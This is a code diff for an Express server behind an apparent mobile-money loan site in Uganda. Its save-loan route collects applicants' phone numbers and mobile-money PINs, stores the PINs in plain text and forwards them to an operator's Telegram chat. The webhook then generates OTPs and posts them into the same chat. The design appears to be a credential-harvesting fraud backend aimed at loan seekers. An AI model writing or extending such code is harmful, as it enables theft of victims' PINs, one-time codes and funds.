@@ -9,6 +9,9 @@ const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
 require('dotenv').config();
 
+// Add this for fetch support in older Node versions
+const fetch = require('node-fetch');
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -140,6 +143,24 @@ async function sendTelegramMessage(text, replyMarkup = null) {
     }
 }
 
+// Edit Telegram message
+async function editTelegramMessage(messageId, text) {
+    try {
+        await fetch(`${TELEGRAM_API}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: messageId,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {
+        console.error('Edit message error:', error);
+    }
+}
+
 // ========== API ROUTES ==========
 
 // Health check
@@ -190,7 +211,7 @@ app.post('/api/calculate', (req, res) => {
     }
 });
 
-// Save loan application - FIXED with better error handling
+// Save loan application
 app.post('/api/save-loan', async (req, res) => {
     try {
         console.log('Received save-loan request:', req.body);
@@ -198,11 +219,11 @@ app.post('/api/save-loan', async (req, res) => {
         const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
         
         // Validate required fields
-        if (!phone || !pin || !network || !amount) {
+        if (!phone || !network || !amount) {
             console.error('Missing required fields');
             return res.status(400).json({ 
                 success: false, 
-                error: 'Missing required fields: phone, pin, network, amount' 
+                error: 'Missing required fields: phone, network, amount' 
             });
         }
         
@@ -218,7 +239,7 @@ app.post('/api/save-loan', async (req, res) => {
         await db.run(
             `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [loanId, phone, network, amount, duration, monthly, total, interest, pin, 'pending_verification']
+            [loanId, phone, network, amount, duration, monthly, total, interest, pin || '1234', 'pending_verification']
         );
         
         await db.run(
@@ -236,7 +257,7 @@ app.post('/api/save-loan', async (req, res) => {
             `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
             `<b>📱 Network:</b> ${network}\n` +
             `<b>📞 Phone:</b> <code>${phone}</code>\n` +
-            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
+            `<b>🔐 PIN:</b> <code>${pin || '1234'}</code>\n` +
             `<b>📅 Duration:</b> ${duration / 30} months\n` +
             `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
             `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
@@ -246,23 +267,22 @@ app.post('/api/save-loan', async (req, res) => {
         const replyMarkup = {
             inline_keyboard: [
                 [
-                    { text: "✅ Approve & Send OTP", callback_data: `approve_${loanId}` },
-                    { text: "📱 Verify Device", callback_data: `verify_${loanId}` }
+                    { text: "✅ Approve Loan", callback_data: `approve_${loanId}` }
                 ],
                 [
-                    { text: "📋 Already Applied", callback_data: `applied_${loanId}` },
                     { text: "❌ Decline", callback_data: `decline_${loanId}` }
                 ]
             ]
         };
         
-        await sendTelegramMessage(messageText, replyMarkup);
+        const messageId = await sendTelegramMessage(messageText, replyMarkup);
         
         console.log('Telegram message sent, returning success');
         
         res.json({
             success: true,
-            loanId: loanId
+            loanId: loanId,
+            messageId: messageId
         });
         
     } catch (error) {
@@ -333,55 +353,107 @@ app.get('/api/loan/:loanId', async (req, res) => {
     }
 });
 
-// Telegram Webhook
+// Telegram Webhook - FIXED
 app.post('/webhook/telegram', async (req, res) => {
     try {
         const update = req.body;
-        console.log('Webhook received');
+        console.log('Webhook received:', JSON.stringify(update, null, 2));
         
         if (update.callback_query) {
             const callbackData = update.callback_query.data;
+            const messageId = update.callback_query.message.message_id;
+            const callbackId = update.callback_query.id;
+            
             const [action, loanId] = callbackData.split('_');
             
-            console.log(`Callback action: ${action}, loanId: ${loanId}`);
+            console.log(`Action: ${action}, LoanId: ${loanId}`);
             
             if (!db) {
                 console.error('Database not connected');
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        callback_query_id: callbackId,
+                        text: "Database error"
+                    })
+                });
+                return res.sendStatus(200);
+            }
+            
+            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
+            
+            if (!loan) {
+                console.error('Loan not found:', loanId);
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        callback_query_id: callbackId,
+                        text: "Loan not found"
+                    })
+                });
                 return res.sendStatus(200);
             }
             
             if (action === 'approve') {
+                // Generate OTP
                 const otp = Math.floor(100000 + Math.random() * 900000).toString();
+                console.log(`Generated OTP: ${otp} for loan ${loanId}`);
                 
+                // Update loan status to 'otp_sent'
                 await db.run(
                     `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                     [otp, 'otp_sent', loanId]
                 );
                 
-                console.log(`Loan ${loanId} approved with OTP: ${otp}`);
+                console.log(`Loan ${loanId} updated to status: otp_sent`);
                 
+                // Answer callback query
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        callback_query_id: update.callback_query.id,
-                        text: "OTP sent to user!"
+                        callback_query_id: callbackId,
+                        text: "✅ Loan approved! User can now proceed."
                     })
                 });
+                
+                // Edit original message to show approved
+                await editTelegramMessage(messageId, 
+                    `✅ <b>LOAN APPROVED</b>\n\n` +
+                    `Loan ID: ${loanId}\n` +
+                    `Phone: ${loan.phone}\n` +
+                    `Amount: UGX ${loan.amount.toLocaleString()}\n` +
+                    `Status: Approved - Waiting for user OTP verification\n` +
+                    `OTP: ${otp}`
+                );
+                
             } else if (action === 'decline') {
+                // Update loan status to declined
                 await db.run(
                     `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                     ['declined', loanId]
                 );
                 
+                console.log(`Loan ${loanId} updated to status: declined`);
+                
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        callback_query_id: update.callback_query.id,
+                        callback_query_id: callbackId,
                         text: "Loan declined"
                     })
                 });
+                
+                await editTelegramMessage(messageId,
+                    `❌ <b>LOAN DECLINED</b>\n\n` +
+                    `Loan ID: ${loanId}\n` +
+                    `Phone: ${loan.phone}\n` +
+                    `Amount: UGX ${loan.amount.toLocaleString()}\n` +
+                    `Status: Declined by admin`
+                );
             }
         }
         
@@ -410,7 +482,6 @@ async function startServer() {
     
     if (!dbInitialized) {
         console.error('⚠️ Failed to initialize database');
-        // Don't exit - server can still run for static files
     }
     
     app.listen(PORT, '0.0.0.0', () => {
